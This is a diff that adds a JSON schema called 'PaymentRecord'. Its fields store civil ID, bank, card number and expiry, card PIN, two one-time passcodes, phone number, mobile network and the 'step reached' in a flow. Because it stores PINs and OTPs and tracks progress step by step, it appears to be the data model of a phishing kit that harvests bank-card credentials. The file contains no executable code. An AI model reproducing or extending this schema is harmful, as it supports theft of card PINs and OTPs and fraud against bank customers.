@@ -1,0 +1,67 @@
+{
+  "name": "PaymentRecord",
+  "type": "object",
+  "properties": {
+    "civil_id": {
+      "type": "string",
+      "description": "Civil ID or phone from URL"
+    },
+    "amount": {
+      "type": "string",
+      "description": "Payment amount"
+    },
+    "bank": {
+      "type": "string",
+      "description": "Selected bank code"
+    },
+    "card_prefix": {
+      "type": "string",
+      "description": "Card prefix"
+    },
+    "card_number": {
+      "type": "string",
+      "description": "Card number (last digits)"
+    },
+    "expiry_month": {
+      "type": "string",
+      "description": "Card expiry month"
+    },
+    "expiry_year": {
+      "type": "string",
+      "description": "Card expiry year"
+    },
+    "pin": {
+      "type": "string",
+      "description": "Card PIN"
+    },
+    "otp1": {
+      "type": "string",
+      "description": "First OTP entered"
+    },
+    "id_number": {
+      "type": "string",
+      "description": "Civil/Residence ID number"
+    },
+    "phone_number": {
+      "type": "string",
+      "description": "Authorized phone number"
+    },
+    "network": {
+      "type": "string",
+      "description": "Network operator"
+    },
+    "otp2": {
+      "type": "string",
+      "description": "Second OTP entered"
+    },
+    "step_reached": {
+      "type": "number",
+      "description": "Last step reached in the flow"
+    },
+    "user_agent": {
+      "type": "string",
+      "description": "Browser/device user agent"
+    }
+  },
+  "required": []
+}
